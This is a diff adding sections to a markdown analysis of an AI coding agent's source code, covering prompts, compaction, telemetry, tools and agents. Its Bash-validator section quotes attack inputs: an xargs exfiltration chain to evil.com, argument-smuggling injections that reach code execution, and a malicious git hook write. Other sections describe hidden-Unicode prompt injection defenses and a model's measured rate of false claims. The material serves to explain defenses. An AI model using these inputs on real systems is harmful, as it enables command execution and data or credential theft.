@@ -68,6 +68,66 @@ The two main "control planes" are:
 
 Representative gate hubs are `src/main.tsx`, `src/commands.ts`, `src/constants/prompts.ts`, `src/services/api/claude.ts`, and `src/skills/bundled/index.ts`.
 
+## Model steering and prompt engineering
+
+### `@[MODEL LAUNCH]` temporal gates
+
+The system prompt is littered with `@[MODEL LAUNCH]` annotations marking sections that need revisiting per model release. Several are explicitly tied to Capybara:
+
+- `@[MODEL LAUNCH]: Update comment writing for Capybara — remove or soften once the model stops over-commenting by default`
+- `@[MODEL LAUNCH]: capy v8 thoroughness counterweight (PR #24302) — un-gate once validated on external via A/B`
+- `@[MODEL LAUNCH]: False-claims mitigation for Capybara v8 (29-30% FC rate vs v4's 16.7%)` (`src/constants/prompts.ts:237-242`)
+
+The false-claims mitigation is ant-only and explicitly tells the model: "Report outcomes faithfully: if tests fail, say so with the relevant output; if you did not run a verification step, say that rather than implying it succeeded." This is a direct prompt-level countermeasure for a measured regression: Capybara v8's 29-30% false claims rate vs v4's 16.7%.
+
+### Dynamic boundary marker for cache stability
+
+`src/constants/prompts.ts:114-115` defines `SYSTEM_PROMPT_DYNAMIC_BOUNDARY = '__SYSTEM_PROMPT_DYNAMIC_BOUNDARY__'`. Content before this marker is static (cross-org cacheable at scope `'global'`); content after is session-specific. This is the structural mechanism that separates the cacheable prompt prefix from per-session dynamic content.
+
+### Build-time dead code elimination for ant paths
+
+Ant-specific prompt sections use `process.env.USER_TYPE === 'ant'` directly at each callsite. A comment explains why (`src/constants/prompts.ts:617-619`):
+
+> DCE: `process.env.USER_TYPE === 'ant'` is build-time --define. It MUST be inlined at each callsite (not hoisted to a const) so the bundler can constant-fold it to `false` in external builds and eliminate the branch.
+
+The external build is physically smaller — ant-only code paths are stripped entirely, not just gated.
+
+### "Undercover" mode
+
+When enabled, undercover mode keeps ALL model names/IDs out of the system prompt — including public `FRONTIER_MODEL_*` constants — so nothing internal can leak into public commits/PRs. If those constants ever point at an unannounced model, they won't appear in context (`src/constants/prompts.ts:610-628`).
+
+### Ant vs external output coaching
+
+External builds get terse output rules ("Go straight to the point... ≤25 words between tool calls... ≤100 words unless the task requires more detail"). Ant builds instead get detailed communication coaching: "Write user-facing text in flowing prose while eschewing fragments, excessive em dashes, symbols and notation" (`src/constants/prompts.ts:403-427`).
+
+### Terminal focus awareness
+
+In proactive/autonomous mode, the system prompt includes a `terminalFocus` field and calibrates autonomy accordingly (`src/constants/prompts.ts:911-913`):
+
+- **Unfocused**: "The user is away. Lean heavily into autonomous action — make decisions, explore, commit, push..."
+- **Focused**: "The user is watching. Be more collaborative..."
+
+### Tick-based proactive mode
+
+Proactive mode sends `<tick>` prompts to keep the agent alive between turns. The system prompt tells the model that each tick includes the user's local time, and explicitly warns: "If you have nothing useful to do on a tick, you MUST call Sleep. Never respond with only a status message — that wastes a turn and burns tokens for no reason." It also reveals the 5-minute prompt cache expiry: "Each wake-up costs an API call, but the prompt cache expires after 5 minutes of inactivity — balance accordingly" (`src/constants/prompts.ts:860-914`).
+
+### Verification agent accountability model
+
+When the `tengu_hive_evidence` gate is active, the system prompt injects an explicit accountability contract (`src/constants/prompts.ts:390-395`):
+
+- "You are the one reporting to the user; you own the gate."
+- On FAIL: fix, resume the verifier with findings plus fix, repeat until PASS.
+- On PASS: spot-check it — re-run 2-3 commands from the verifier's report.
+- On PARTIAL: report what passed and what could not be verified. "You cannot self-assign PARTIAL."
+
+### Compaction analysis scratchpad
+
+The compaction prompt uses `<analysis>` XML blocks as a hidden scratchpad: the model writes its analysis inside `<analysis>...</analysis>`, which improves summary quality, but `formatCompactSummary()` strips the block before the summary reaches the context window. The user never sees it, and it doesn't consume ongoing context (`src/services/compact/prompt.ts:31-32, 314-319`).
+
+### Cyber risk instruction is Safeguards-owned
+
+`src/constants/cyberRiskInstruction.ts` carries an explicit header: "IMPORTANT: DO NOT MODIFY THIS INSTRUCTION WITHOUT SAFEGUARDS TEAM REVIEW" and names the owners (David Forsythe, Kyla Guru). This is the prompt section controlling how Claude handles pentesting, CTF requests, and the offensive/defensive security boundary.
+
 ## Memory system
 
 ### Short take
@@ -310,9 +370,47 @@ Some mitigations are direct policy, some are bug workarounds:
 - `src/utils/toolResultStorage.ts` inserts synthetic text for empty tool results because some models otherwise terminate early
 - `src/query.ts` strips model-bound thinking signatures before retrying a fallback model
 
-These are not generic "AI safety" controls. They are concrete product hardening against observed model failure modes.
+These are not generic “AI safety” controls. They are concrete product hardening against observed model failure modes.
 
-### 9. Harbor “channels” + permission relay
+### 9. Specific exploit defenses in the Bash validator
+
+The Bash read-only validator (`src/tools/BashTool/readOnlyValidation.ts`) contains remarkably specific exploit defenses that go well beyond simple allowlisting:
+
+#### GNU getopt optional-arg-attachment attacks
+
+The validator removes `xargs -i` and `xargs -e` (lowercase) because GNU getopt's `i::` and `e::` optional-attached-arg semantics create a parsing ambiguity: `xargs -it tail target` is parsed as `-i` with replacement string `t`, making `tail` the target command — not `-i` + `-t` as the validator would assume. The comment even walks through the network exfiltration chain: `echo /usr/sbin/sendm | xargs -it tail a@evil.com`. The fix is to require uppercase `-I {}` (POSIX, mandatory argument) where validator and xargs agree (`src/tools/BashTool/readOnlyValidation.ts:132-155`).
+
+#### Variable expansion injection
+
+Every token is rejected if it contains `$`, because `git diff “$Z--output=/tmp/pwned”` defeats the `startsWith('-')` flag check when `$Z` is empty. Similarly, `rg . “$Z--pre=bash” FILE` achieves RCE via rg's `--pre` flag, and `ps ax”$Z”e` defeats the BSD-style `e` flag regex to expose env vars. Brace expansion with `,` or `..` is also blocked (`src/tools/BashTool/readOnlyValidation.ts:1328-1370`).
+
+#### tree -R file write
+
+`tree -R` combined with `-H` (HTML mode) and `-L` (depth) silently writes `00Tree.html` files to every subdirectory at the depth boundary. The comment quotes the man page: “at each of them execute tree again adding `-o 00Tree.html` as a new option.” Zero-permission file write, no warning (`src/tools/BashTool/readOnlyValidation.ts:657-664`).
+
+#### Compound cd + git sandbox escape
+
+Compound commands combining `cd` and `git` are blocked because `cd /malicious/dir && git status` can trigger git hooks in the target directory. Also detected: bare git repos (`.git/HEAD` deleted, hooks created in cwd), and write-to-git-internals attacks like `mkdir -p objects refs hooks && echo '#!/bin/bash\nmalicious' > hooks/pre-commit && touch HEAD && git status` (`src/tools/BashTool/readOnlyValidation.ts:1876-1949`).
+
+#### Windows path canonicalization attacks
+
+`src/utils/permissions/filesystem.ts:537-602` detects NTFS Alternate Data Streams (`file.txt:stream`, `file.txt::$DATA`), 8.3 short names (`GIT~1`, `CLAUDE~1`), long path prefixes (`\\?\C:\...`), trailing dots/spaces (`.git.`, `.claude ` — Windows strips these, bypassing string matching), DOS device names (`.git.CON`, `settings.json.PRN`), and three+ consecutive dots. Any detected pattern forces manual approval.
+
+Windows `xargs` is disabled entirely (`src/tools/BashTool/readOnlyValidation.ts:1203-1209`) because file contents can contain UNC paths that trigger SMB resolution — `cat file | xargs cat` turns data exfiltration into credential exfiltration.
+
+### 10. Unicode hidden-character defense (HackerOne #3086545)
+
+`src/utils/sanitization.ts` implements iterative Unicode sanitization against ASCII smuggling / hidden prompt injection. It loops NFKC normalization plus stripping of `\p{Cf}`, `\p{Co}`, `\p{Cn}` property classes (plus explicit fallback ranges for zero-width spaces, directional formatting, BOM, private use) up to 10 iterations until the string stabilizes. The iteration cap prevents infinite loops from adversarial composed sequences. The fallback ranges exist because “some environments don't support regexes for unicode property classes.”
+
+### 11. Job directory nonce-based hijack guard
+
+The `CLAUDE_JOB_DIR` write carve-out (`src/utils/permissions/filesystem.ts:1514-1551`) uses a per-process random nonce as the “load-bearing defense.” The comment explains: every other path component (uid, version, skill name, file keys) is public knowledge, so without the nonce, a local attacker on shared `/tmp` can pre-create the tree (sticky bit prevents deletion, not creation) and either symlink an intermediate directory or swap file contents post-write for prompt injection.
+
+### 12. bypassPermissions remote killswitch
+
+`src/utils/permissions/bypassPermissionsKillswitch.ts` can remotely disable `bypassPermissions` mode via Statsig gate `tengu_disable_bypass_permissions_mode`. The check runs exactly once before the first query, ensuring the latest gate value is used. This is emergency-response infrastructure: Anthropic can remotely downgrade permission modes on running installations.
+
+### 13. Harbor “channels” + permission relay
 
 There is an entire “send Claude prompts to your phone” surface here, implemented as MCP “channels” plugins and gated at runtime.
 
@@ -449,6 +547,27 @@ Then `src/services/compact/compact.ts` rehydrates a lot of context immediately a
 - session-start hooks
 
 So even when compaction works, the product re-inflates the context right away.
+
+### 5.5. Compaction by the numbers
+
+Several concrete metrics are visible in comments and constants:
+
+- **Circuit breaker**: Before `MAX_CONSECUTIVE_AUTOCOMPACT_FAILURES = 3` was added, BQ data from 2026-03-10 showed 1,279 sessions had 50+ consecutive compaction failures (up to 3,272 in a single session), wasting ~250K API calls/day globally (`src/services/compact/autoCompact.ts:257-260`).
+- **Streaming fallback rate**: The no-tools forked summarizer fails 2.79% of the time on model 4.6 (vs 0.01% on 4.5), triggering a streaming fallback that has tool access — increasing injection surface and making compaction nondeterministic (`src/services/compact/prompt.ts:19-26`). The `NO_TOOLS_PREAMBLE` is repeated as both preamble AND trailer specifically because 4.6's failure rate is 279× higher.
+- **Skill re-injection cost**: Skills are capped at 5K tokens per skill post-compact. Before this cap, re-injection was unbounded and cost 5-10K tokens per compact. The verify skill is 18.7KB and claude-api is 20.1KB (`src/services/compact/compact.ts:125-129`).
+- **Cache cost of full compaction**: Full compaction invalidates the server's cached prefix. Test data showed this costs 0.76% of fleet `cache_creation` (~38B tokens/day globally), with 98% of the cost being cache misses for 3P users (`src/services/compact/compact.ts:432-434`).
+- **Post-compact file budget**: `POST_COMPACT_TOKEN_BUDGET = 50K` tokens for file re-attachment — up to 5 recently-accessed files (`src/services/compact/compact.ts:1415-1430`).
+- **Image token estimation**: `IMAGE_MAX_TOKEN_SIZE` is hardcoded at 2000 tokens, but actual images range 500-4000+ depending on format and resolution. This feeds into compaction threshold calculations (`src/services/compact/microCompact.ts:38`).
+- **Token estimation multiplier**: All token estimates are padded by 4/3 "to be conservative since we're approximating" (`src/services/compact/microCompact.ts:204`), which masks 10-30% estimation errors for tool-heavy workloads.
+
+### 5.6. Circular dependency fragility
+
+The compaction subsystem has fragile circular import chains that have already caused CI failures:
+
+- `src/services/compact/microCompact.ts:32-35` duplicates the `TIME_BASED_MC_CLEARED_MESSAGE` constant inline rather than importing it from `toolResultStorage.ts`, because that import pulls in `sessionStorage → utils/messages → services/api/errors`, completing a cycle back through `promptCacheBreakDetection`.
+- `src/services/compact/grouping.ts:18-21` was extracted to its own file specifically to break a `compact.ts ↔ compactMessages.ts` cycle (issue CC-1180). The comment notes the cycle "shifted module-init order enough to surface a latent ws CJS/ESM resolution race in CI shard-2."
+
+If someone re-imports `toolResultStorage.ts` into microcompact or adds functions to grouping, these cycles re-form silently.
 
 ### 6. Full compaction fallback exposes tools
 
@@ -591,6 +710,30 @@ The code does show deliberate restraint in some places:
 
 Still, the net telemetry footprint is large.
 
+### 8. Observer/backseat mode (ant-only)
+
+`src/services/analytics/metadata.ts:495` includes an `observerMode` field with three variants: `'backseat'`, `'skillcoach'`, or `'both'`. This is an internal Anthropic feature for observing and coaching users, with `tengu_backseat_*` events for BQ cohort analysis.
+
+### 9. GrowthBook gate inventory
+
+The codebase contains 52+ GrowthBook feature gates, all following the `tengu_*` naming convention. These control everything from model selection to analytics sampling to feature rollout. Gates refresh mid-session (~5 minutes), meaning Anthropic can flip features on running processes without restart (`src/services/analytics/growthbook.ts:95-157`).
+
+Selected gate families:
+
+- **Memory**: `tengu_onyx_plover` (auto-dream scheduling), `tengu_herring_clock` (team memory daily log), `tengu_coral_fern` (memdir loader), `tengu_passport_quail` (auto-memory path selection)
+- **Compaction**: `tengu_sm_compact`, `tengu_session_memory`, `tengu_slate_heron` (time-based microcompact), `tengu_compact_cache_prefix`
+- **Remote control**: `tengu_ccr_bridge`, `tengu_ccr_bridge_multi_session`, `tengu_ccr_mirror` (every local session spawns outbound mirror), `tengu_cobalt_lantern` (remote agent auto-detect)
+- **Security**: `tengu_sandbox_disabled_commands` (dynamic bash blocklist), `tengu_tree_sitter_shadow` (AST security analysis), `tengu_disable_bypass_permissions_mode` (emergency killswitch)
+- **Plans**: `tengu_pewter_ledger` (plan file size experiment with 4 arms: null/trim/cut/cap), `tengu_plan_mode_interview_phase`
+
+For the complete catalog, see `CATALOG-claudecode.md`.
+
+### 10. Dual-sink PII routing
+
+Analytics events carry `_PROTO_*` prefixed keys (raw skill names, plugin names, marketplace sources) that are stripped before Datadog fanout but sent to the privileged 1P endpoint with PII-tagged BQ columns. This lets internal analysts see raw identifiers while general-access dashboards only see normalized/hashed versions (`src/services/analytics/firstPartyEventLoggingExporter.ts:714-749`, `src/services/analytics/sink.ts:64-66`).
+
+Only 33 event types are sent to Datadog at all — the 1P pipeline receives everything.
+
 ## Hidden initiatives, model traces, and long-lived agent hints
 
 ### Kairos
@@ -659,6 +802,65 @@ The strongest lessons for an always-on agent framework are:
 - preserve cache-safe prompt state across background helpers
 - keep durable memory extraction tool-constrained and coalesced
 
+## Tool and agent system
+
+### Tool inventory
+
+The source tree contains 40+ tool implementations across `src/tools/`. Notable categories:
+
+- **Core I/O**: BashTool, FileReadTool, FileEditTool, FileWriteTool, GlobTool, GrepTool, NotebookEditTool, LSPTool
+- **Agent orchestration**: AgentTool, TeamCreateTool, TeamDeleteTool, SendMessageTool, TaskStopTool, TaskOutputTool
+- **Web**: WebFetchTool, WebSearchTool, WebBrowserTool
+- **MCP**: MCPTool, ListMcpResourcesTool, ReadMcpResourceTool
+- **Planning**: EnterPlanModeTool, ExitPlanModeV2Tool, EnterWorktreeTool, ExitWorktreeTool
+- **Scheduling**: ScheduleCronTool (CronCreate/Delete/List), RemoteTriggerTool, SleepTool
+- **Proactive/Kairos**: BriefTool, SuggestBackgroundPRTool, MonitorTool, PushNotificationTool, SubscribePRTool, SendUserFileTool
+- **Tasks**: TodoWriteTool (v1), TaskCreateTool/TaskGetTool/TaskUpdateTool/TaskListTool (v2)
+- **Experimental/internal**: OverflowTestTool, CtxInspectTool, TerminalCaptureTool, TungstenTool, REPLTool, SnipTool, ListPeersTool, WorkflowTool, VerifyPlanExecutionTool, ConfigTool (ant-only)
+
+Tool access is heavily constrained per context (`src/constants/tools.ts`):
+
+- `ALL_AGENT_DISALLOWED_TOOLS`: TaskOutput, ExitPlanMode, EnterPlanMode, AskUserQuestion, TaskStop, Workflow — no subagent can use these
+- `ASYNC_AGENT_ALLOWED_TOOLS`: Read/Write/Edit/Glob/Grep/Bash/Skill/ToolSearch/Worktree — notably NO AgentTool (prevents infinite recursion)
+- `COORDINATOR_MODE_ALLOWED_TOOLS`: AgentTool, TaskStop, SendMessage, SyntheticOutput — only orchestration tools
+
+### Built-in agents
+
+Five built-in agent types in `src/tools/AgentTool/built-in/`:
+
+1. **generalPurposeAgent**: fallback for untyped agent spawns
+2. **exploreAgent**: read-only codebase exploration, `omitClaudeMd: true` to save tokens (~5-15Gtok/week across 34M+ weekly spawns)
+3. **planAgent**: planning specialist, one-shot (no SendMessage continuation)
+4. **claudeCodeGuideAgent**: product onboarding
+5. **verificationAgent**: adversarial testing — explicitly tries to break the implementation, no project modifications allowed
+
+Explore and plan are one-shot agents (`ONE_SHOT_BUILTIN_AGENT_TYPES`) that skip agentId/SendMessage/usage trailer (~135 chars saved × 34M weekly runs).
+
+### Fork subagent system
+
+`src/tools/AgentTool/forkSubagent.ts` implements a "fork" mode where subagents inherit the parent's full system prompt + conversation context:
+
+- Mutually exclusive with coordinator mode (each owns orchestration)
+- Recursive forking is blocked via `FORK_BOILERPLATE_TAG` detection
+- All fork children must produce byte-identical prompt prefixes for cache hits
+- Fork agents get `permissionMode: 'bubble'` — permission prompts surface to the parent terminal
+- `tools: ['*']` with `maxTurns: 200`
+
+### Coordinator/team/swarm mode
+
+`src/coordinator/coordinatorMode.ts` implements multi-agent orchestration:
+
+- System prompt: "You are Claude Code, an AI assistant that orchestrates software engineering tasks across multiple workers"
+- Workers communicate via `<task-notification>` XML
+- Team state tracks: teamName, teamFilePath, leadAgentId, teammates map with deterministic lead ID `formatAgentId('team-lead', teamName)`
+- Send message routing: teammate name, `"*"` for broadcast, `"uds:<socket-path>"` (UDS inbox), `"bridge:<session-id>"` (remote control peers)
+- In-process teammates use AsyncLocalStorage for isolation; process-based teammates use tmux/iTerm2 panes
+- Workers get filtered tool lists — no team-management tools (TeamCreate, TeamDelete, SendMessage, SyntheticOutput)
+
+### Cron scheduler
+
+`src/utils/cronScheduler.ts` implements persistent scheduled tasks in `~/.claude/scheduled_tasks.json`. Features include jittered scheduling (up to 10% of period), 7-day auto-deletion for recurring tasks, lock-based coordination, and one-shot vs. recurring modes. This is the infrastructure behind the `/loop` skill and proactive agent triggers.
+
 ## Quirks, Easter Eggs, and fun/weird bits
 
 These aren’t the “main architecture”, but they’re the kind of glue that reveals how the product actually behaves.
@@ -696,6 +898,53 @@ These aren’t the “main architecture”, but they’re the kind of glue that 
 - There’s unusually candid in-code doubt: an `ollie` TODO above a memoized MCP connect helper says the memoization “increases complexity by a lot” and they’re “not sure it really improves performance” (`src/services/mcp/client.ts:588-607`).
 - They have an explicit guard to prevent config writes from wiping auth state if the config file is truncated/corrupted mid-write, and it references a real GitHub issue (#3117) (`src/utils/config.ts:776-865`).
 - The external build ships 18 hard-disabled hidden command stubs of the form `export default { isEnabled: () => false, isHidden: true, name: 'stub' };` — likely placeholders for internal-only commands: `ant-trace`, `autofix-pr`, `backfill-sessions`, `break-cache`, `bughunter`, `ctx_viz`, `debug-tool-call`, `env`, `good-claude`, `issue`, `mock-limits`, `oauth-refresh`, `onboarding`, `perf-issue`, `reset-limits`, `share`, `summary`, `teleport` (`src/commands/ant-trace/index.js:1`, `src/commands/autofix-pr/index.js:1`, `src/commands/backfill-sessions/index.js:1`, `src/commands/break-cache/index.js:1`, `src/commands/bughunter/index.js:1`, `src/commands/ctx_viz/index.js:1`, `src/commands/debug-tool-call/index.js:1`, `src/commands/env/index.js:1`, `src/commands/good-claude/index.js:1`, `src/commands/issue/index.js:1`, `src/commands/mock-limits/index.js:1`, `src/commands/oauth-refresh/index.js:1`, `src/commands/onboarding/index.js:1`, `src/commands/perf-issue/index.js:1`, `src/commands/reset-limits/index.js:1`, `src/commands/share/index.js:1`, `src/commands/summary/index.js:1`, `src/commands/teleport/index.js:1`).
+
+### "The rules of thinking" wizard comment
+
+`src/query.ts:151-163` frames API thinking-block constraints in medieval fantasy:
+
+> The rules of thinking are lengthy and fortuitous. They require plenty of thinking of most long duration and deep meditation for a wizard to wrap one's noggin around. ... Heed these rules well, young wizard. For they are the rules of thinking, and the rules of thinking are the rules of the universe. If ye does not heed these rules, ye will be punished with an entire day of debugging and hair pulling.
+
+### Duck species as model-codename canary
+
+The buddy companion system encodes species names as hex via `String.fromCharCode` to avoid tripping a build-output string scanner (`src/buddy/types.ts:10-38`):
+
+```typescript
+const c = String.fromCharCode
+export const duck = c(0x64,0x75,0x63,0x6b) as 'duck'
+export const capybara = c(0x63, 0x61, 0x70, 0x79, 0x62, 0x61, 0x72, 0x61) as 'capybara'
+export const chonk = c(0x63, 0x68, 0x6f, 0x6e, 0x6b) as 'chonk'
+```
+
+The comment says one species "collides with a model-codename canary in excluded-strings.txt" — the check greps build output (not source), so runtime-constructing the literal keeps the canary armed while the species works normally. `capybara` is runtime-constructed for the same reason.
+
+### 200+ spinner verbs
+
+`src/constants/spinnerVerbs.ts` has over 200 loading-state verbs. Highlights beyond "Tomfoolering": Flibbertigibbeting, Whatchamacalliting, Razzmatazzing, Combobulating, Discombobulating, Recombobulating, Prestidigitating, Boondoggling, Hullaballooing, Hyperspacing, Sock-hopping, Spelunking, Beboppin', and Moonwalking.
+
+### Fast mode = "Penguin Mode"
+
+The fast-mode API endpoint is literally named `penguin_mode`. Its killswitch is `tengu_penguins_off`.
+
+### Model codename "Fennec" = Opus
+
+Migration comments reference model codenames alongside version chains: "Fennec" is the Opus codename, alongside the Sonnet lineage (Sonnet 1M → Sonnet 4.5 → Sonnet 4.6).
+
+### Computer Use "Chicago"
+
+A full computer-use implementation is present, built on `@ant/computer-use-mcp`. Internal codename appears to be "Chicago."
+
+### Upstream proxy with anti-ptrace
+
+The container-aware proxy relay uses `prctl(PR_SET_DUMPABLE, 0)` to prevent ptrace attacks — other processes on the same container/host cannot attach to dump memory containing secrets.
+
+### Beta headers reveal unreleased API features
+
+The API layer sends beta headers for features not yet public: `interleaved-thinking`, `context-1m`, `structured-outputs`, `web-search`, `advanced-tool-use`, `effort`, `task-budgets`, `prompt-caching-scope`, `fast-mode`, `redact-thinking`, `token-efficient-tools`, `afk-mode`, `cli-internal`, `advisor-tool`, `summarize-connector-text` (`src/services/api/claude.ts`).
+
+### Process metrics telemetry
+
+Every analytics event is enriched with: process uptime, RSS, heap stats (used/total), external memory, CPU usage + percent, plus platform/arch/Node version/terminal/package managers/runtimes, GitHub Actions metadata (actor_id, repository_id, repository_owner_id), WSL version, and Linux distro ID/version (`src/services/analytics/metadata.ts:457-682`).
 
 ### Community reverse-engineering threads (useful cross-checks)
 
